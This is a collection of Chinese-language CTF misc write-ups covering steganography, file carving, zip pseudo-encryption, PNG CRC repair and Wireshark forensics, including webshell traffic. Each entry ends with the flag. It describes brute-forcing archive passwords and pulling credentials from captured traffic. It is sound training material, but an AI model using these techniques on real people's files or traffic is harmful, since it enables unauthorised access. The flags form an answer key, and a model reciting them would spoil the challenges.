### 1.金三胖（gif查帧-stegsolve）

用stegsolve打开，使用其中的Analyse逐帧浏览，查找隐藏信息

![image-20231130200806613](assets/image-20231130200806613.png)



```flag
flag{he11ohongke}
```

### 2.二维码(文件分离(binwalk等)、压缩密码爆破)

binwalk 文件 一下发现文件末尾有压缩包，内部有文件名4number.txt的提示，`binwalk -e` 提取出来。

![image-20231130200104057](assets/image-20231130200104057.png)

![image-20231130200242680](assets/image-20231130200242680.png)

根据 `4 number` 的提示，使用 ARCHPR 爆破压缩包密码。

![image-20231130200409967](assets/image-20231130200409967.png)

得到密码为 7639，解压得到 flag。

```flag
CTF{vjpw_wnoei}
```

### 3.N种方法解决(file文件分析、base64转图片、二维码识别)

没法正常运行的 exe 文件，010 editor 打开，发现只是一张 base64 的图片。

![image-20231130210050837](assets/image-20231130210050837.png)

或者拿到linux，用 file 分析一下，本质上是 ASCII 文本，被换了格式，cat 输出文本，这里面是一张图片的 Base64 编码过后的内容，直接复制到在线 Base64 转图片平台还原

![image-20231130210602677](assets/image-20231130210602677.png)

base解码

![image-20231130210702804](assets/image-20231130210702804.png)

看到png图片头，想到直接base64转成图片(**也可以直接选文件模式旁边的显示图片**)

![image-20231130210829681](assets/image-20231130210829681.png)

解码之后得到一个二维码。

![image-20231130211033028](assets/image-20231130211033028.png)

工具扫码得 flag。

![image-20231130211109514](assets/image-20231130211109514.png)

```flag
KEY{dca57f966e4e4e31fd5b15417da63269}
```

### 4.大白（图片属性修改，宽高，010editor模板发现CRC校验错误）

题目提示：看不到图？  是不是屏幕太小了（猜测是图片宽高被修改）

经验：**图片在linux下打不开，在windows下打得开，一般就是宽高被修改了**

![image-20231130202228272](assets/image-20231130202228272.png)

![image-20231130202253894](assets/image-20231130202253894.png)



用 010 editor 打开图片，运行模板发现 CRC 校验错误，猜测是图片宽高被修改。用脚本跑出宽高。

```python
import binascii
import struct
crcbp = open("dabai.png", "rb").read()
for i in range(2000):
    for j in range(2000):
        data = crcbp[12:16] + struct.pack('>i', i)+struct.pack('>i', j)+crcbp[24:29]
        crc32 = binascii.crc32(data) & 0xffffffff
        if(crc32 == 0x6D7C7135):#根据图片CRC来修改
            print(i, j)
            print('hex:', hex(i), hex(j))
```

![image-20231130204956546](assets/image-20231130204956546.png)

得到高度应为 `01 DF`，对应修改得到原图。

先介绍一下png文件16进制格式及相关位置

![image-20231130205052599](assets/image-20231130205052599.png)

![image-20231130205341178](assets/image-20231130205341178.png)

```flag
flag{He1l0_d4_ba1}
```

### 5.你竟然赶我走（png图片隐写-16进制打开）

用 010 editor 打开图片可发现文件的末尾有 flag。

![image-20231130201113997](assets/image-20231130201113997.png)

```flag
flag{stego_is_s0_bor1ing}
```

### 6.基础破解（压缩包密码爆破，ARCHPR工具的使用）

题目：给你一个压缩包，你并不能获得什么，因为他是四位数字加密的哈哈哈哈哈哈哈。。。不对= =我说了什么了不得的东西。

根据题目描述可知压缩包的密码为四位数字。ARCHPR 爆破得到密码 2563。

#### 1.ARCHPR爆破

设定四位数字暴力破解

![image-20231130213434001](assets/image-20231130213434001.png)

解压可得到一串 base64。

```text
ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30=
```

解码可得到 flag。

```flag
flag{70354300a5100ba78068805661b93a5c}
```

### 7.乌镇峰会种图(16进制查看，jpg图片)

题目提示：乌镇互联网大会召开了，各国巨头汇聚一堂，他们的照片里隐藏着什么信息呢？

用 010 editor 打开图片，直接搜索flag字符的16进制值：666c6167,找到在行号51BDh,转到，发现flag

![image-20231130211843310](assets/image-20231130211843310.png)

```flag
flag{97314e7864a8f62627b26f3f998c37f1}
```

### 8.LSB(LSB隐写+stegsolve解决LSB隐写，本题目无法用kali中的zsteg解决)

使用 StegSolve 解得 LSB 下存在 PNG 文件。

![image-20231130215816207](assets/image-20231130215816207.png)

调出之后，点击savebin,保存到文件1.png,发现是个二维码，工具扫码得到flag

![image-20231130220014394](assets/image-20231130220014394.png)

```flag
cumtctf{1sb_i4_s0_Ea4y}
```

### 9.文件中的秘密(文件属性查看、16进制打开文件查找信息)

查看文件属性发现flag

![image-20231130213901311](assets/image-20231130213901311.png)

用 010 editor 打开文件，在数据帧中可以找到 flag.

（搜索flag关键字的16进制形式）

```
666c6167
66006C0061006700
```

![image-20231130215003609](assets/image-20231130215003609.png)

```flag
flag{870c5a72806115cb5439345d8b014396}
```

### 10.rar（rar压缩包密码爆破）

这个是一个rar文件，里面好像隐藏着什么秘密，但是压缩包被加密了，毫无保留的告诉你，rar的密码是4位纯数字。

根据题目描述可知压缩包的密码为四位数字。ARCHPR 爆破得到密码 8795。

解压可得到 flag。

```flag
flag{1773c5da790bd3caff38e3decd180eb7}
```

### 11.wireshark(关键词搜索、http流追踪)

使用 wireshark 打开流量包，筛选 http 条目。根据提示可知要找管理员密码。找到登录的 POST 请求，可以看到管理员密码。

或者：直接ctrl+N，开启搜索，选择字符串模式，搜索关键词flag,发现可疑http包，右键追踪http流，找到管理员密码，即为flagffb7567a1d4f4abdffdb54e022f8facd

![image-20231130212801473](assets/image-20231130212801473.png)

```flag
flag{ffb7567a1d4f4abdffdb54e022f8facd}
```

### 12.qr(二维码直接识别)

扫描二维码得出 flag。

```flag
Flag{878865ce73370a4ce607d21ca01b5e59}
```

### 13.zip伪加密

#### 法一：修改标记位

全局方式位标记的四个数字中只有第二个数字对其有影响

未加密：

    文件头中的全局方式位标记为00 00
    目录中源文件的全局方式位标记为00 00

伪加密：

    文件头中的全局方式位标记为00 00
    目录中源文件的全局方式位标记为09 00

真加密：

    文件头中的全局方式位标记为09 00
    目录中源文件的全局方式位标记为09 00

**第二个数字为奇数时 –>加密**

**第二个数字为偶数时 –>未加密** 

![image-20231130221853649](file://D:\mytools\MyNote\CTF\misc\assets\image-20231130221853649.png?lastModify=1701353948)

**红色部分对应**压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志**这三大部分，绿色部分就是全局方式位标记，第二位数字改为偶数即可破解。**

010 editor 打开文件，修改 `frFlags` 和 `deFlags`为 `00` 即可去除伪加密。

![image-20231130223016849](assets/image-20231130223016849.png)

#### 法二：使用工具**zipCenOp.jar**清除密码

```
指令：java -jar ZipCenOp.jar r xxx.zip
```

![image-20231130223433372](assets/image-20231130223433372.png)

之后就可以解压了

解压即可得到 flag。

```flag
flag{Adm1N-B2G-kU-SZIP}
```

### 14.ningen(jpg文件包含压缩包)

010 editor 查看文件可知文件尾部有压缩文件。

或者难得记文件头尾，直接binwalk一下：

![image-20231130230721464](assets/image-20231130230721464.png)

发现有zip压缩文件，包含ningen.txt文件

`binwalk -e` 分理出压缩包，根据题目描述猜测为四位数密码，用 ARCHPR 爆破得出解压密码为 8368。

解压出文件可得 flag。

```flag
flag{b025fc9ca797a67d2103bfbc407a6d5f}
```

### 15.镜子里面的世界(LSB隐写：StegSolve解、kali中zsteg解)

#### 法一：StegSolve 解 LSB 隐写可得信息。

![image-20231130225550943](assets/image-20231130225550943.png)

提取出来可得 flag。

#### 法二：zsteg处理图片

![image-20231130230043337](assets/image-20231130230043337.png)

```flag
flag{st3g0_saurus_wr3cks}
```

### 16.被嗅探的流量(文件传输追踪、POST筛选)

题目：某黑客潜入到某公司内网通过嗅探抓取了一段文件传输的数据，该数据也被该公司截获，你能帮该公司分析他抓取的到底是什么文件的数据吗？

文件传输，应该是走的http/https流量，POST发包，wireshark 分析流量包，筛选 http 条目可看到一个图片的 POST。

或者直接筛选POST流：**http.request.method==POST**

![image-20231130224602784](assets/image-20231130224602784.png)

```flag
flag{da73d88936010da1eeeb36e945ec4b97}
```

### 17.小明的保险箱（jpg文件包含压缩包）

010 editor 打开文件，文件尾部发现压缩文档。`binwalk -e` 分离出来。

![image-20231130231834658](assets/image-20231130231834658.png)

根据题目描述可知压缩包的密码为四位数字。ARCHPR 爆破得到密码 7869。

![img](assets/646ebfb6240bb7e62f479ece911e2a94.png)

解压出文件可得 flag。

```flag
flag{75a3d68bf071ee188c418ea6cf0bb043}
```

### 18.爱因斯坦(图片属性藏信息、jpg图片包含压缩包)

010 editor 打开解压的图片，文件尾部可以发现压缩文档。

或者直接binwalk 文件 分析一下文件，发现有zip

`binwalk -e` 分离出来。

![img](assets/32b18be5e4a9e6d0a715d469d437fe7d.png)

发现需要解压密码，同时在图片的备注中有 `this_is_not_password`。

![image-20231130231534892](assets/image-20231130231534892.png)

将其作为解压密码成功解压文件，即可得到 flag。

```flag
flag{dd22a92bf2cceb6c0cd0d6b83ff51606}
```

### 19.easycap(流量长度分析，追踪TCP流)

Wireshark 打开流量包，直接搜索flag关键字，发现搜索不到，后面按长度排序，发现有长度异常，进去查找没有发现，又发现全是 TCP 流，于是追踪 TCP 流，可得 flag。

![img](assets/83c70ec35a8ef0c685d8bc5490c7b7c1.png)

```flag
flag{385b87afc8671dee07550290d16a8071}
```

### 20.另外一个世界(jpg文件尾部藏数据)

binwalk无结果

010打开，搜索flag无结果

```
666c6167
66006c0061006700
```

010 editor 打开文件，模板报错 `Missing End of File marker`，发现文件尾部有数据。

```text
01101011011011110110010101101011011010100011001101110011
```

将其写作八位一组之后转 ASCII 可得 `koekj3s`。

或者直接工具箱二进制转字符

```flag
flag{koekj3s}
```

### 21.FLAG(LSB隐写，不认识的文件二进制打开，查看文件头辨识，直接查找关键字)

binwalk和zsteg发现存在zip压缩包

![image-20231130233635286](assets/image-20231130233635286.png)

binwalk -e分离文件

![image-20231130233842937](assets/image-20231130233842937.png)

发现zlib压缩包，但是解压不了，此路不通

换路：

StegSolve 解 LSB 隐写可发现一个压缩文件。

![image-20231201000152014](assets/image-20231201000152014.png)

保存下来，不知道是个啥文件，拿到linux去binwalk，发现包含zip文件，binwalk -e分离，之后解压得到一个文件。又不认识，拿到010editor看看，

![image-20231201000844499](assets/image-20231201000844499.png)

直接在里面找到了flag

![image-20231201001224650](assets/image-20231201001224650.png)

或者是个ELF文件，使用 Linux 终端运行可得 flag。

再或者：用string 命令查看内容

![image-20231201001328079](assets/image-20231201001328079.png)

```flag
hctf{dd0gf4c3tok3yb0ard4g41n~~~}
```

### 22.隐藏的钥匙(jpg隐写，16进制提取，base64)

binwalk无结果

![image-20231130232747848](assets/image-20231130232747848.png)

010 editor 打开文件可见 flag 提示。

搜索flag关键字的16进制字符：

```
666c6167
66006c0061006700
```

![image-20231130232926327](assets/image-20231130232926327.png)

提取出来之后 base64 解码可得 flag。

```flag
flag{377cbadda1eca2f2f73d36277781f00a}
```

### 23.假如给我三天光明(盲文解码，音频摩斯密码)

图片中的盲文根据对照表解出为 `kmdonowg`。将其作为压缩包密码解密音频文件。

![image-20231201004123405](assets/image-20231201004123405.png)

明显是英语字母盲文，从左到右分别代表：kmdonowg
 解压出音频，是摩斯电码，用Audacity提取

![image-20231201004556099](assets/image-20231201004556099.png)

```flag
较长的蓝色即为“-”，较短的即为“.”，每一段由-和.组成的即为一个字符。用“/”间隔。
-.-./-/..-./.--/.--././../-----/---../--.../...--/..---/..--../..---/...--/-../--../

flag{wpei08732?23dz}
```

![image-20231201004914633](assets/image-20231201004914633.png)

### 24.神秘龙卷风(brainfuck编码，+.-等符号)

根据题目描述可知压缩包的密码为四位数字。ARCHPR 爆破得到密码 5463。

![image-20231201001649498](assets/image-20231201001649498.png)

解压出来发现一个文本，使用 Brainfuck 解码之后得到 flag。

![image-20231201001741697](assets/image-20231201001741697.png)

![image-20231201001840388](assets/image-20231201001840388.png)

```flag
flag{e4bbef8bdf9743f8bf5b727a9f6332a8}
```

### 25.后门查杀(火绒自动报毒)

下载代码下来审计，发现如下一行。`$pass = '6ac45fb83b3bc355c024f5034b947dd3'; //angel` 直接取出字符串得到 flag。

```flag
flag{6ac45fb83b3bc355c024f5034b947dd3}
```

![image-20231201005138879](assets/image-20231201005138879.png)

### 26.荷兰宽带数据泄露(.bin路由配置文件，)

.bin 文件，猜测是路由器配置文件。使用 RouterPassView 查看，尝试之后发现用户名字段为 flag。

![image-20231201010222104](assets/image-20231201010222104.png)

```flag
flag{053700357621}
```

### 27.来首歌吧（摩斯密码，CwGet工具(不会用)，audacity）

打开音频文件，发现中间夹杂着莫斯电码，使用 CwGet 接收，得到 flag。

使用audacity打开音频，发现有两个音频轨道，上面的轨道，Ctrl+滑轮放大，按长短记录

![image-20231201083950630](assets/image-20231201083950630.png)

![image-20231201084205623](assets/image-20231201084205623.png)

图上第一个字符有误，音频中为 `.....` 应为 `5`。

```flag
...../-.../-.-./----./..---/...../-..../....-/----./-.-./-.../-----/.----/---../---../..-./...../..---/./-..../.----/--.../-../--.../-----/----./..---/----./.----/----./.----/-.-.
morse解码为：
5BC925649CB0188F52E617D70929191C
flag{5BC925649CB0188F52E617D70929191C}
```

或者



### 28.数据包中的线索（TCP流追踪，base64解码，转图片）

Wireshark 分析数据包，追踪 TCP 流，右下角切换流，在第七个流，可以发现 base64 数据。

![image-20231201003133797](assets/image-20231201003133797.png)

复制下来，base64解码，发现图片头，

![image-20231201003224095](assets/image-20231201003224095.png)

转图片

![image-20231201003118443](assets/image-20231201003118443.png)

```flag
flag{209acebf6324a09671abc31c869de72c}
```

### 29.九连环(binwalk分离文件无法解密，使用steghide处理)

010 editor 打开文件，发现其尾部有压缩文档。（也可直接binwalk发现两层zip文件）

![image-20231201085325018](assets/image-20231201085325018.png)

![image-20231201085343819](assets/image-20231201085343819.png)

`binwalk -e` 分离出来，得到套娃的两个压缩文件。

第二层图片拿出来准备010打开看看，结果发现是空的，说明binwalk分离失败，于是尝试用foremost分析提取一下

![image-20231201090117886](assets/image-20231201090117886.png)

得到一个压缩包，但是被加密了，十六进制判断一下是否是伪加密

全局搜索压缩文件源文件目录区标志位的16进制字符（504b0102）,寻找他后面四字节位置的全局方式标记位

![image-20231201090903398](assets/image-20231201090903398.png)

第二层的图片被加密了，找不到其他信息，猜测是伪加密。修改 `14 00 01 08` 为 `14 00 00 08` 成功解压出图片。

![image-20231201091255148](assets/image-20231201091255148.png)

![image-20231201091313187](assets/image-20231201091313187.png)

然后 jpg 图片看隐写，用binwalk、strings、file等都看不出什么，于是用StegHide处理隐写

```
steghide info 文件名   #查看文件隐藏信息，发现藏有ko.txt
steghide extract -sf 文件名  #提取隐藏文件
```

![image-20231201091819471](assets/image-20231201091819471.png)

成功解出 secret，得到第三层压缩包密码 `bV1g6t5wZDJif^J7`。

解压即可得到 flag。

```flag
flag{1RTo8w@&4nK@z*XL}
```

### 30.面具下的flag(jpg文件带有压缩文件，binwalk分离，磁盘文件解压)

010 editor 打开文件，发现其尾部有压缩文档。

![img](assets/0cb7db01e832487c38bbb5ff04086dae.png)

`binwalk -e` 分离出来，得到一个加密的压缩文档。分析之后可知是伪加密，修正之后解压得到虚拟磁盘文件。使用 `7z x flag.vmdk` 解压并重命名 `NUL` 文件之后可以得到两端文本。

```text
+++++ +++++ [->++ +++++ +++<] >++.+ +++++ .<+++ [->-- -<]>- -.+++ +++.<
++++[ ->+++ +<]>+ +++.< +++++ +[->- ----- <]>-- ----- --.<+ +++[- >----
<]>-- ----- .<+++ [->++ +<]>+ +++++ .<+++ +[->- ---<] >-.<+ +++++ [->++
++++< ]>+++ +++.< +++++ [->-- ---<] >---- -.+++ .<+++ [->-- -<]>- ----- .<
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook?
Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!
Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook.
Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook?
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook.
Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!
Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?
Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook. Ook?
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook.
Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook!
Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!
Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.
```

分别将其使用 Brainfuck 和 Ook! 解码之后可以得到 flag。

```flag
flag{N7F5_AD5_i5_funny!}
```

### 31.webshell后门

跟之前的后门查杀一样，找到 `$pass = 'ba8e6c6f35a53933b871480bb9a9545c'; //angel` 即得到 flag。

```flag
flag{ba8e6c6f35a53933b871480bb9a9545c}
```

### 32.被劫持的神秘礼物（流量分析，找账号密码）

题目：某天小明收到了一件很特别的礼物，有**奇怪的后缀，奇怪的名字和格式**。小明找到了知心姐姐度娘，度娘好像知道这是啥，但是度娘也不知道里面是啥。。。你帮帮小明？找到**帐号密码，串在一起，用32位小写MD5哈希一下得到的就是答案**。 链接: https://pan.baidu.com/s/1pwVVpA5_WWY8Og6dhCcWRw 提取码: 31vk

题目要求拿到账号密码进行哈希，一般在登陆数据等等，使用 Wireshark 分析流量包，筛选 http 条目，找到唯一的 POST 请求，即可得到账号密码。

![image-20231201095536434](assets/image-20231201095536434.png)

根据提示将帐号密码串起来再 MD5 一次即得到 flag。

```flag
flag{1d240aafe21a86afc11f38a45b541a49}
```

### 33.刷新过的图片（F5隐写，F5-steganography工具，zip伪加密）

常用刷新键：F5，于是联想到F5隐写

解压得到一张图片，根据暗示尝试 F5 隐写。

```
java Extract  文件绝对路径  -p 密码  -e 输出文件（后面两个可以省略）
```

![image-20231201104131804](assets/image-20231201104131804.png)

`java Extract .\Misc.jpg` 解得一个文档。

binwalk分析为压缩文件，上面的文件头也可以看出来

![image-20231201104430872](assets/image-20231201104430872.png)

分析后为伪加密，010erditor打开，搜索标志位：504b0102,讲其四字节后的0100,改为偶数，0000

![image-20231201104643109](assets/image-20231201104643109.png)

![image-20231201104938180](assets/image-20231201104938180.png)

将 `deFlag` 处改为 `00 00` 即可解压出 flag。

```flag
flag{96efd0a2037d06f34199e921079778ee}
```

### 34.snake(Serpent加密算法)

010 editor 打开文件，发现其尾部有压缩文档。binwalk分析得到有压缩文档

![image-20231201105311817](assets/image-20231201105311817.png)

`binwalk -e` 分离出来，解压得到两个文件。将 key 文件中的 base64 解码得到如下文本。

```text
What is Nicki Minaj's favorite song that refers to snakes?
```

Nicki Minaj关于蛇的歌《Anaconda》即为密钥，但是并不知道什么加密方式，实际上Serpent也有蛇的意思，Serpent是一个加密算法（不看大佬博客真想不到）使用对应解密工具解密可得 flag。

解密网站：http://serpent.online-domain-tools.com/

```flag
CTF{who_knew_serpent_cipher_existed}
```

### 梅花香之苦寒来(010打开，16进制转字符，gp256工具套件中的gnuplot坐标绘图，QR_Reasrarch识别二维码)

010 editor 打开文件，很大，发现其后半部有数据。

![image-20231201110031403](assets/image-20231201110031403.png)

猜测是十六进制，将其转为字符串，下面是转换脚本

```python
with open('hex.txt', 'r') as h:     # hex.txt为要转换的文本文件
    val = h.read()
    h.close()

with open('result.txt', 'w') as re: # 转换完成后写入result.txt
    tem = ''
    for i in range(0, len(val), 2):
        tem = '0x' + val[i] + val[i+1]
        tem = int(tem, base=16)
        print(chr(tem), end="")
        re.write(chr(tem))
    re.close()
```

打开result.txt，发现是一堆坐标

![image-20231201110527979](assets/image-20231201110527979.png)

结合之前查看图片属性里的文件信息，发现要画图，所以这里就借用gnuplot来进行绘制([gnuplot下载地址](https://pan.baidu.com/s/1VE72XqOErGFQqJeuI3lIug), 提取码：wel5)
不过在使用gnuplot之前需要先将坐标格式转换成gnuplot可以识别的格式，下面是脚本

```python
with open('result.txt', 'r') as res:  # 坐标格式文件比如(7,7)
    re = res.read()
    res.close()
# 写文件,将转换后的坐标写入gnuplotTxt.txt
with open('F:\Download/test.txt','w') as rw:
    re = re.split()
    for i in range(0,len(re)):
        tem = re[i]
        # tem = tem.lstrip('(').rstrip(')')
        tem = tem.strip('()')# 去除左右()
        tem = tem.replace(',',' ')#替换逗号成空格
        rw.write(tem + '\n')
        print(tem)

```

安装好gnuplot后，可以去环境变量里添加变量，之后就可以直接在命令行输入gnuplot来运行了

![image-20231201111835030](assets/image-20231201111835030.png)

![image-20231201111812369](assets/image-20231201111812369.png)

![image-20231201112307423](assets/image-20231201112307423.png)

QR Rearch扫描二维码即可得出 flag。

```flag
flag{40fc0a979f759c8892f4dc045e28b820}
```

### 菜刀666(恶意流量分析、foremost分离pcpng流量包)

http.request.method==POST,追踪TCP流发现十六进制FF D8开头FF D9结尾，判断为jpg图片.


```py
import binascii
s = "十六进制内容"
with open('1.jpg','wb') as f:
    f.write(binascii.unhexlify(s))
```

得到一张带密码的图片。binwalk分离流量包得到zip，输入密码即可。

**详细解法：**

根据题目菜刀666，与菜刀有关，一般都是post连接，于是我们过滤post数据

```
http.request.method==POST
```

![image](assets/2685364-20230322142432882-513872187.png)

在`tcp.stream eq 7`中发现了大量数据

![image](assets/2685364-20230322142505902-1711036553.png)

右键追踪TCP流，看到传了两个参数，z1是base64加密，z2是十六进制

![image](assets/2685364-20230322142559461-489690472.png)

z1的末尾%3D是url编码，解码为 =
 ![image](assets/2685364-20230322142800434-1241666129.png)

z1的base64解密，得到文件上传的目录
 ![image](assets/2685364-20230322142839281-1214874308.png)

z2的十六进制粘贴道HxD中，可以看出来是一个jpg图片
 ![image](assets/2685364-20230322142946756-676018836.png)

保存为jpg，得到图片，应该是压缩包密码`Th1s_1s_p4sswd_!!!`
 ![image](assets/2685364-20230322143102124-408301939.png)

使用foremost命令，分离流量包
 `foremost 666666.pcpng`
 ![image](../../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/misc/assets/2685364-20230322143303024-301893090.png)
 ![image](assets/2685364-20230322143353024-1196049493.png)

输入上面得到的密码，得flag
 ![image](assets/2685364-20230322143443199-884893710.png)

```flag
flag{3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z}
```

### 被偷走的文件(流量分析，压缩包提取，binwalk分离文件)

一黑客入侵了某公司盗取了重要的机密文件，还好管理员记录了文件被盗走时的流量，请分析该流量，分析出该黑客盗走了什么文件

题目提示是文件下载，于是大致浏览流量包发现存在FTP协议，过滤一下

![image-20231201134350212](assets/image-20231201134350212.png)

Wireshark 分析流量包，跟踪 TCP 流，可以发现一个压缩文档。

![image-20231201133724587](assets/image-20231201133724587.png)

![image-20231201133745317](assets/image-20231201133745317.png)

将其保存下来(我保存失败，16进制字符总是出错，于是用binwalk工具分离文件得到压缩包)然后使用 ARCHPR 爆破得出解压密码为 5790。

![img](assets/e06da317d107e879f0eec11c544db9d2.png)

解压文件即可得到 flag。

```flag
flag{6fe99a5d03fb01f833ec3caa80358fa3}
```

### [BJDCTF2020]认真你就输了(binwalk分析、分离文件（xls）)

老规矩，无收获就先binwalk

![image-20231201145445182](assets/image-20231201145445182.png)

藏了一堆东西

binwalk -e 提取出来，或者直接改后缀成zip，解压，之后找到 `../charts/flag.txt`，打开即可得到 flag。

```flag
flag{M9eVfi2Pcs#}
```

### [BJDCTF2020]藏藏藏(binwalk分析、foremost分离文件)

binwalk分析发现存在压缩包，但是分离失败

![image-20231201150107340](assets/image-20231201150107340.png)

换foremost 从图片中分离出一个压缩文档，打开后可以得到一个 Word 文档，打开后可得一个二维码。



![img](assets/7071eeb803e0407c4dd48607c8ac62fe.png)

扫描二维码可得 flag。

```flag
flag{you_are_the_best!}
```

### [GXYCTF2019]佛系青年（zip压缩文档伪加密，ZipCenOp.jar工具清除假密码，修正）

附加压缩文档存在伪加密，直接使用ZipCenOp.jar工具清除密码

```cmd
java -jar ZipCenOp.jar r "xxx.zip"
命令执行成功之后，压缩包就可以正常解压了
```

之后解压可得一个文本文档。在其中有如下提示。

```text
佛曰：遮等諳勝能礙皤藐哆娑梵迦侄羅哆迦梵者梵楞蘇涅侄室實真缽朋能。奢怛俱道怯都諳怖梵尼怯一罰心缽謹缽薩苦奢夢怯帝梵遠朋陀諳陀穆諳所呐知涅侄以薩怯想夷奢醯數羅怯諸
```

使用与佛论禅程序解密可得 flag。

```flag
flag{w0_fo_ci_Be1}
```

### 秘密文件（流量分析，binwalk提取文件）

与被偷走的文件一致，Wireshark 分析流量包跟踪 TCP 流，可以发现一个压缩文档。

直接binwalk分离一下文件

![image-20231201153233124](assets/image-20231201153233124.png)

![img](assets/995ebc905d6e2964558c11821e3e631b.png)

然后使用 ARCHPR 爆破得出解压密码为 1903。

![image-20231201153251080](assets/image-20231201153251080.png)

解压文件即可得到 flag。

```flag
flag{6fe99a5d03fb01f833ec3caa80358fa3}
```

### [BJDCTF2020]你猜我是个啥（binwalk查看文件信息/zsteg提取信息）

发现无法打开题目给出的压缩包，于是binwalk一下，发现png,zlib的头部，分理处zlib文件，于是知道走错路了。

根据png信息，修改后缀为png

![image-20231201151426571](assets/image-20231201151426571.png)

是个二维码，但是扫码没有啥发现，于是二进制打开看看，打开时，010editor模板报错，说明文件被修改过，于是直接搜索关键字

```
flag
666c6167
```

![image-20231201151654452](assets/image-20231201151654452.png)

```flag
flag{i_am_fl@g}
```

法二：png图片，直接zsteg秒了

![image-20231201152901299](assets/image-20231201152901299.png)



### [SWPU2019]神奇的二维码（分离文件，png文件想到zsteg,morse密码）

看到png要想到zsteg,文件常规要用用binwalk,于是发现隐藏有信息，藏了压缩包，还有内部一些像base64的信息

![image-20231201153708531](assets/image-20231201153708531.png)

base64解码是一段键盘按键，不知道有啥用

```
YXNkZmdoamtsMTIzNDU2Nzg5MA==
asdfghjkl1234567890
```

之后分离文件，除开找到的彩蛋，有用的信息在一个 Word 文档中，疯狂套娃 base64 解码之后得到 `comEON_YOuAreSOSoS0great`。

```python
import base64

file = open('112233.txt','r').read()
while True:
    try:
        file = base64.b64decode(file)
    except:
        print(str(file, 'utf-8'))
        break
```

将这串字符串作为压缩包密码解压出音频。之后morse解码即可

```flag
flag{morseisveryveryeasy}
```

### [BJDCTF2020]一叶障目（png图片CRC_宽高修复.py）

png图片，当然先zsteg、binwalk一波，无果

![image-20231201162038291](assets/image-20231201162038291.png)

010打开，发现

![image-20231201162219027](assets/image-20231201162219027.png)

PNG 文件 CRC32 校验失败，加之 zsteg、StegSolve 无解，于是猜测图片宽高不对。使用CRC宽高修复.py脚本修复宽高 ,即可得到flag

```python
import zlib
import struct

# 读文件
file = '123.png'  # 图片要和脚本在同一个文件夹下
fr = open(file, 'rb').read()
data = bytearray(fr[12:29]) # 生成字节数组
crc32key = eval(str(fr[29:33]).replace('\\x', '').replace("b'", '0x').replace("'", '')) # 格式化
n = 4095  # 理论上0xffffffff,但考虑到屏幕实际，0x0fff就差不多了
for w in range(n):  # 高和宽一起爆破
    width = bytearray(struct.pack('>i', w))  # q为8字节; i为4字节; h为2字节
    for h in range(n):
        height = bytearray(struct.pack('>i', h))
        for x in range(4):
            data[x + 4] = width[x]
            data[x + 8] = height[x]
            # print(data)
        crc32result = zlib.crc32(data) # CRC校验和
        if crc32result == crc32key:
            print(width, height)
